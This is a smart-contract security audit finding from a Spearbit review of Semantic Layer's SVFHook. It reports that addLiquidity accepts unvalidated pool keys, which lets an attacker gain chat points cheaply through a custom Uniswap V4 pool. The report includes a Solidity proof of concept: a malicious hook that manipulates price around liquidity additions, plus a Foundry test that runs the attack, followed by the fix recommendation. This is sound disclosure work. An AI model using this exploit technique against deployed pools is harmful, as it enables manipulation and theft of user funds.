---
tags:
  - lang/solidity
  - sector/dex
  - sector/governance
  - sector/nft
  - sector/streaming
  - platform/spearbit
  - has/github
  - has/poc
  - severity/high
  - precondition/specific-token-type
protocol: "[[Semantic Layer]]"
auditors:
  - "[[Tnch]]"
report: "https://github.com/spearbit/portfolio/blob/master/pdfs/Semantic-Layer-Spearbit-Security-Review-May-2025.pdf"
genome:
  - "[[decimal-mismatch]]"
  - "[[fee-theft]]"
  - "[[specific-token-type]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[timestamp-dependence]]"
---
# Chat points manipulation by adding liquidity to custom pools via SVFHook contract

- id: 62647
- impact: HIGH
- protocol: Semantic Layer
- reporter: Tnch (Spearbit)
- source: https://github.com/spearbit/portfolio/blob/master/pdfs/Semantic-Layer-Spearbit-Security-Review-May-2025.pdf

## Summary


The SVFHook contract has a function called `addLiquidity` that allows users to increase their chat points by depositing liquidity into a Uniswap V4 pool. However, this function does not check if the pool key provided is associated with the SVFHook contract, allowing users to add liquidity to other Uniswap V4 pools and exploit the system. This can be done by deploying a malicious hook and a custom Uniswap V4 pool, altering the price and taking advantage of refunds. The recommendation is to validate the keys passed to the functions to prevent this exploit. 

## Details

## High Risk Report

**Severity:** High Risk

**Context:** (No context files were provided by the reviewer)

## Description

The `addLiquidity` function of the `SVFHook` contract is intended for users to increase their available chat points by depositing liquidity (WETH/SVF) into a Uniswap V4 pool. The function allows callers to specify the key of the pool they add liquidity to using the `key` parameter. 

However, the function does not enforce that the given pool key is indeed associated with the `SVFHook` contract. This allows adding liquidity to other Uniswap V4 pools that trade the same tokens via `SVFHook::addLiquidity`. This can result in users abusing this functionality by deploying their custom pools with malicious hooks attached, adding liquidity to their own pools, and still increasing their chat points in the system at lower costs than if they did it via other means.

### Possible Attack Vector

1. Attacker deploys a malicious hook that is able to alter liquidity before and after it’s added to a pool (that is, setting hook flags `BEFORE_ADD_LIQUIDITY_FLAG`, `AFTER_ADD_LIQUIDITY_FLAG`, and `AFTER_ADD_LIQUIDITY_RETURNS_DELTA_FLAG`).
2. Attacker deploys a custom Uniswap V4 pool to trade SVF / WETH, attaching the hook deployed in (1).
3. In `addLiquidity`, the liquidity to mint is based on the price at the beginning of the execution. This means the attacker can now leverage their hooks to freely alter the actual price at which liquidity is added (different from the initial price queried by the system), and get chat points at lower costs than expected.
4. Because the attacker managed to alter the price at will to benefit their position, they can take advantage of the refunds from the `SVFHook` to recover part of the actual assets provided at first.

## Proof of Concept

In the `test_spearbit_addLiquidityCustomPoolWithHook` function below, we've developed a test case building upon the test scenarios available in `SVFHook.t.sol`, which showcases one possible case of exploiting the vulnerability described.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {SqrtPriceMath} from "v4-core/src/libraries/SqrtPriceMath.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {CurrencyLibrary, Currency} from "v4-core/src/types/Currency.sol";
import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {SafeCast} from "v4-core/src/libraries/SafeCast.sol";
import {LiquidityAmounts} from "v4-core/test/utils/LiquidityAmounts.sol";
import {IPositionManager} from "v4-periphery/src/interfaces/IPositionManager.sol";
import {EasyPosm} from "./utils/EasyPosm.sol";
import {Fixtures} from "./utils/Fixtures.sol";
import {ERC721, ERC721TokenReceiver} from "solmate/src/tokens/ERC721.sol";
import "@uniswap/v4-core/test/utils/LiquidityAmounts.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import "../src/hook/SVFHook.sol";
import "../src/Master42.sol";
import "../src/SVFToken.sol";
import "../src/Warehouse13.sol";
import "../src/Vesting.sol";
import {WETH} from "solmate/src/tokens/WETH.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {BaseHook} from "v4-periphery/src/utils/BaseHook.sol";
import {BalanceDeltaLibrary} from "v4-core/src/types/BalanceDelta.sol";
import {toBalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {Deployers} from "v4-core/test/utils/Deployers.sol";

// The attacker's hook contract that will be attached to their custom Uniswap V4 pool
contract BadLiquidityHook is BaseHook {
    uint160 public constant MIN_PRICE_LIMIT = TickMath.MIN_SQRT_PRICE + 1;
    uint160 public constant MAX_PRICE_LIMIT = TickMath.MAX_SQRT_PRICE - 1;
    BalanceDelta swapDelta;
    bool hasLiquidity;

    constructor(IPoolManager _manager) BaseHook(_manager) {}

    function _beforeAddLiquidity(
        address,
        PoolKey calldata poolKey,
        IPoolManager.ModifyLiquidityParams calldata,
        bytes calldata
    ) internal override returns (bytes4) {
        if (hasLiquidity) {
            bool zeroForOne = true;
            swapDelta = poolManager.swap(
                poolKey,
                IPoolManager.SwapParams(
                    zeroForOne, 100_000_000_000 ether, zeroForOne ? MIN_PRICE_LIMIT : MAX_PRICE_LIMIT
                ),
                bytes("")
            );
        }
        return IHooks.beforeAddLiquidity.selector;
    }

    function _afterAddLiquidity(
        address sender,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata params,
        BalanceDelta delta,
        BalanceDelta feesAccrued,
        bytes calldata hookData
    ) internal override returns (bytes4, BalanceDelta) {
        if (hasLiquidity) {
            bool zeroForOne = false;
            swapDelta = poolManager.swap(
                key,
                IPoolManager.SwapParams(zeroForOne, swapDelta.amount1(), zeroForOne ? MIN_PRICE_LIMIT : MAX_PRICE_LIMIT),
                bytes("")
            );
        }
        return (BaseHookUpgradeable.afterAddLiquidity.selector, toBalanceDelta(0, 0));
    }

    function getHookPermissions() public pure override returns (Hooks.Permissions memory) {
        return Hooks.Permissions({
            beforeInitialize: false,
            afterInitialize: false,
            beforeAddLiquidity: true,
            afterAddLiquidity: true,
            beforeRemoveLiquidity: false,
            afterRemoveLiquidity: false,
            beforeSwap: false,
            afterSwap: false,
            beforeDonate: false,
            afterDonate: false,
            beforeSwapReturnDelta: false,
            afterSwapReturnDelta: false,
            afterAddLiquidityReturnDelta: true,
            afterRemoveLiquidityReturnDelta: false
        });
    }
}

contract SVFHookTest is Test, Fixtures, ERC721TokenReceiver {
    using SafeCast for int128;
    using EasyPosm for IPositionManager;
    using PoolIdLibrary for PoolKey;
    using CurrencyLibrary for Currency;
    using StateLibrary for IPoolManager;

    uint256 constant MAX_DEADLINE = 12329839823;
    uint160 SQRT_5000_1 = 5602277097478613991873193822745; // price = token1/token0 = 5000/1 = 5000
    uint160 SQRT_2000_1 = 3543190000000000000000000000000; // price = token1/token0 = 2000/1 = 2000
    uint160 SQRT_2100000_10 = 36306905189387912912677825629223;
    uint256 internal ownerPrivateKey = 0xad111;
    address internal owner = vm.addr(ownerPrivateKey);
    uint256 internal aiPrivateKey = 0x0d3;
    address internal ai = vm.addr(aiPrivateKey);
    uint256 internal daoPrivateKey = 0xda0;
    address internal dao = vm.addr(daoPrivateKey);
    int24 MIN_TICK;
    int24 MAX_TICK;
    int24 constant MAX_TICK_SPACING = 32767;

    SVFHook hook;
    SVFToken svftoken;
    Warehouse13 warehouse13;
    Master42 master42;
    Vesting vesting;
    PoolId poolId;
    Currency wethCurrency;
    Currency svfCurrency;
    uint256 svfTotalSupply = 42_000_000 ether;

    function setUp() public {
        vm.label(owner, "owner");
        deployFreshManagerAndRouters();
        // setup function calls
        wethCurrency = deployMintAndApproveWETH();
        svfCurrency = deployMintAndApproveSVF();

        deployPosmWETH(manager);
        approvePosmCurrency(wethCurrency);
        approvePosmCurrency(svfCurrency);
        
        // Deploy warehouse13
        address warehouse13Proxy = Upgrades.deployUUPSProxy(
            "out/Warehouse13.sol/Warehouse13.json",
            abi.encodeCall(Warehouse13.initialize, (address(svftoken), address(dao), address(ai)))
        );
        warehouse13 = Warehouse13(warehouse13Proxy);
        vm.label(address(warehouse13), "warehouse13");

        // Deploy vesting contract
        uint256 vestingAmount = svfTotalSupply * 90 / 100;
        vesting = new Vesting(address(svftoken), address(warehouse13), vestingAmount, block.timestamp);

        // Deploy Master42
        address master42Proxy = Upgrades.deployUUPSProxy(
            "out/Master42.sol/Master42.json",
            abi.encodeCall(Master42.initialize, (address(owner), address(ai), 10000000))
        );
        master42 = Master42(master42Proxy);
        vm.label(address(master42), "master42");

        // Mint tokens to provide liquidity
        vm.prank(dao);
        svftoken.mint();
        vm.stopPrank();
        console.log("svftoken total supply after mint", svftoken.totalSupply());

        // Transfer required SVF from DAO to test contract for initial liquidity
        uint256 initialSvfLiquidityAmount = svfTotalSupply * 5 / 100;
        vm.prank(dao);
        svftoken.transfer(address(this), initialSvfLiquidityAmount);
        vm.stopPrank();

        // Transfer vesting amount from DAO to Vesting contract
        vm.prank(dao);
        svftoken.transfer(address(vesting), vestingAmount);
        vm.stopPrank();

        // Set vesting contract address in warehouse13
        vm.startPrank(address(dao));
        warehouse13.setVestingAddress(address(vesting));
        vm.stopPrank();

        // Deploy the hook
        address flags = address(
            uint160(Hooks.BEFORE_INITIALIZE_FLAG) ^ (0x4444 << 144)
        );
        SVFHook hookImpl = new SVFHook();

        bytes memory initializerData = abi.encodeCall(
            SVFHook.initialize, (address(owner), address(manager), payable(address(posm)), address(master42))
        );
        bytes memory constructorArgs = abi.encode(address(hookImpl), initializerData);
        deployCodeTo("ERC1967Proxy.sol:ERC1967Proxy", constructorArgs, flags);
        hook = SVFHook(flags);
        vm.label(address(hook), "hook");

        svftoken.approve(address(hook), type(uint256).max);
        weth.approve(address(hook), type(uint256).max);

        // Whitelist token
        vm.startPrank(owner);
        hook.updateTokenWhitelists(Currency.unwrap(svfCurrency), true);
        vm.stopPrank();

        // Initialize a pool
        PoolKey key = PoolKey(wethCurrency, svfCurrency, 10_000, 3000, IHooks(address(hook)));
        poolId = key.toId();
        manager.initialize(key, SQRT_2100000_10);

        // Update the SVFHook address
        vm.startPrank(owner);
        master42.setHookAddressAndPoolId(address(hook), key.toId());
        vm.stopPrank();

        // Add initial liquidity
        MIN_TICK = TickMath.minUsableTick(key.tickSpacing);
        MAX_TICK = TickMath.maxUsableTick(key.tickSpacing);
    }

    // ... Additional code for liquidity setup and testing
}

function test_spearbit_addLiquidityCustomPoolWithHook() public {
    address attacker = makeAddr("attacker");

    // Prepare mock calls and initial tests
    uint128 liquidity = 10;
    vm.mockCall(
        address(hook),
        abi.encodeWithSelector(ISVFHook.totalLockedFullRangeLiquidity.selector, PoolId.unwrap(master42.poolId())),
        abi.encode(liquidity)
    );

    address flags = address(
        uint160(
            type(uint160).max & clearAllHookPermissionsMask | Hooks.AFTER_ADD_LIQUIDITY_FLAG
            | Hooks.BEFORE_ADD_LIQUIDITY_FLAG | Hooks.AFTER_ADD_LIQUIDITY_RETURNS_DELTA_FLAG
        )
    );
    deployCodeTo("MaliciousHook.t.sol:BadLiquidityHook", abi.encode(manager), flags);

    PoolKey memory attackerPoolKey = PoolKey({currency0: wethCurrency, currency1: svfCurrency, fee: 0, tickSpacing: 3000, hooks: IHooks(flags)});
    assertNotEq(PoolId.unwrap(attackerPoolKey.toId()), PoolId.unwrap(master42.poolId()));

    vm.startPrank(attacker);
    manager.initialize(attackerPoolKey, SQRT_2100000_10);
    deal(address(svftoken), attacker, 1e18);
    deal(address(weth), attacker, 1e18);

    svftoken.approve(address(hook), type(uint256).max);
    weth.approve(address(hook), type(uint256).max);

    // Needs some initial liquidity
    (uint256 uniNFTId,,) = hook.addLiquidity(
        attackerPoolKey,
        SVFHook.AddLiquidityParams({amount0Desired: 1e18, amount1Desired: 1e18, deadline: MAX_DEADLINE})
    );

    // Attack to trigger the second addLiquidity call
    uint256 amt0 = 5 ether;
    uint256 amt1 = 5 ether;
    deal(address(svftoken), attacker, amt0);
    deal(address(weth), attacker, amt1);

    // Add liquidity to the attacker's pool via the hook's addLiquidity function
    (uniNFTId,,) = hook.addLiquidity(
        attackerPoolKey,
        SVFHook.AddLiquidityParams({amount0Desired: amt0, amount1Desired: amt1, deadline: MAX_DEADLINE})
    );

    // Validate that the attacker is in a favorable position
    bytes32 positionKey = calculatePositionKey(address(posm), MIN_TICK, MAX_TICK, bytes32(uniNFTId));
    uint128 actualLiquidity = manager.getPositionLiquidity(attackerPoolKey.toId(), positionKey);
    
    // Assert that the conditions from the attack were successful
    assertEq(hook.balanceOf(attacker), 2);
    
    (uint256 amount, uint256 pointsDebt) = master42.userInfo(0, attacker);
    assertGt(amount, 0);
    assertEq(pointsDebt, 0);
    
    vm.warp(1 days);
    
    // Ensure attacker now has chat points available
    assertGt(master42.availablePoints(attacker), 0);
    vm.stopPrank();
}

// [...]

```

## Recommendation

Validate that the user-controlled keys passed as parameters to the functions in `SVFHook` are correctly validated, ensuring they correspond to the expected Uniswap V4 pools that use the `SVFHook` contract.

**Semantic Layer:** Fixed in PR 5.

**Spearbit:** Fix verified.
